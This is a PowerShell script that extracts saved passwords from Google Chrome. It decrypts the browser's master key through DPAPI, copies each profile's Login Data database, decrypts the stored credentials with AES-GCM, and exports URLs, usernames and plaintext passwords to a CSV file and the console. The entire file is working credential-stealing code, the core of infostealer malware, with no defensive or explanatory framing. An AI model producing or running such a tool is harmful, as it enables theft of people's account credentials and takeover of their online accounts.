# Load SQLite library
Add-Type -Path "C:\System.Data.SQLite.dll"

# Load BouncyCastle library (ensure correct path)
Add-Type -Path "C:\BouncyCastle.Crypto.dll"

# Global Constants
$CHROME_PATH_LOCAL_STATE = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$CHROME_PATH = "$env:LOCALAPPDATA\Google\Chrome\User Data"

function Get-SecretKey {
    param (
        [string]$InputFilePath
    )

    Add-Type -AssemblyName "System.Security"
    $localStateContent = Get-Content -Path $InputFilePath -Raw

    if ($localStateContent -notmatch '"encrypted_key"\s*:\s*"([^"]+)"') {
        Write-Error "Could not find 'encrypted_key' in the input file."
        return $null
    }

    $encryptedKeyBase64 = $matches[1]
    $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)
    $dpapiBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]

    try {
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return $decryptedBytes
    } catch {
        Write-Error "Failed to decrypt the secret key: $_"
        return $null
    }
}

function Generate-Cipher {
    param (
        [byte[]]$aesKey,
        [byte[]]$iv
    )
    $cipher = New-Object Org.BouncyCastle.Crypto.Engines.AesEngine
    $gcmCipher = New-Object Org.BouncyCastle.Crypto.Modes.GcmBlockCipher $cipher
    $parameters = New-Object Org.BouncyCastle.Crypto.Parameters.AeadParameters([Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($aesKey), 128, $iv, $null)
    $gcmCipher.Init($false, $parameters)
    return $gcmCipher
}

function Decrypt-Password {
    param (
        [byte[]]$ciphertext,
        [byte[]]$secretKey
    )
    try {
        if (-not $ciphertext -or -not $secretKey) {
            throw "Ciphertext or secret key is null."
        }

        # Extract IV from ciphertext
        $iv = $ciphertext[3..14]  # Extract IV (12 bytes for GCM)
        # Extract encrypted password (leave out last 16 bytes for GCM)
        $encryptedPassword = $ciphertext[15..($ciphertext.Length - 1)]  # Full payload

        # Generate the cipher
        $cipher = Generate-Cipher -aesKey $secretKey -iv $iv

        # Prepare to decrypt the password
        $decryptedBytes = New-Object byte[] ($encryptedPassword.Length)
        $outputLen = $cipher.ProcessBytes($encryptedPassword, 0, $encryptedPassword.Length, $decryptedBytes, 0)

        # Finish decryption process and check for errors
        $macCheck = $cipher.DoFinal($decryptedBytes, $outputLen)

        # Remove padding if applicable and return decrypted password
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).TrimEnd("`0")
    } catch {
        Write-Error "Unable to decrypt password: $_"
        return ""
    }
}

function Get-DbConnection {
    param (
        [string]$dbPath
    )
    try {
        $tempDbPath = "$env:TEMP\Loginvault.db"
        Copy-Item -Path $dbPath -Destination $tempDbPath -Force
        return [System.Data.SQLite.SQLiteConnection]::new("Data Source=$tempDbPath;Version=3;")
    } catch {
        Write-Error "Chrome database cannot be found: $_"
        return $null
    }
}

# Main Execution
try {
    $secretKey = Get-SecretKey -InputFilePath $CHROME_PATH_LOCAL_STATE
    if (-not $secretKey) {
        Write-Error "Could not retrieve the secret key."
        exit
    }

    $profiles = Get-ChildItem -Path $CHROME_PATH | Where-Object { $_.Name -match "^Profile*|^Default$" }

    # Create CSV file for storing passwords
    $csvPath = "decrypted_passwords.csv"
    $csvWriter = New-Object System.IO.StreamWriter($csvPath, $false)

    # Write CSV header
    $csvWriter.WriteLine("Index,URL,Username,Password")

    foreach ($profile in $profiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        $connection = Get-DbConnection -dbPath $loginDataPath
        if ($secretKey -and $connection) {
            $connection.Open()
            $command = $connection.CreateCommand()
            $command.CommandText = "SELECT action_url, username_value, password_value FROM logins"
            $reader = $command.ExecuteReader()

            $index = 0
            while ($reader.Read()) {
                $url = $reader["action_url"]
                $username = $reader["username_value"]
                $ciphertext = $reader["password_value"]

                if ($url -and $username -and $ciphertext -and $ciphertext.Length -gt 0) {
                    $decryptedPassword = Decrypt-Password -ciphertext $ciphertext -secretKey $secretKey

                    # Check if decryptedPassword is null or empty
                    if (-not $decryptedPassword) {
                        continue  # Skip this entry if the decrypted password is empty
                    }

                    # Write to CSV
                    $csvWriter.WriteLine("$index,$url,$username,$decryptedPassword")
                    Write-Host "Index: $index`nURL: $url`nUsername: $username`nPassword: $decryptedPassword`n"
                    $index++
                }
            }
            $reader.Close()
            $connection.Close()
        }
    }
    $csvWriter.Close()
    Write-Host "Passwords have been exported to $csvPath"
} catch {
    Write-Error "An error occurred: $_"
}
